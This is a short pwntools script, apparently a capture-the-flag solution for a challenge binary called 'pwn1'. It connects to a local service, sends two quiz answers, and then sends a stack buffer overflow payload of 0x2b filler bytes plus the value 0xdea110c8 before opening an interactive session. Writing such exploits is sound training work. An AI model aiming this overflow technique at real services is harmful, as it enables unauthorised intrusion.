#!/usr/bin/env python

from pwn import *

r = remote('127.0.1.1', 13337)
#r = process('pwn1')

r.sendline("Sir Lancelot of Camelot")
r.sendline("To seek the Holy Grail.")
r.sendline("A"*0x2b + p32(0xdea110c8))

r.interactive()
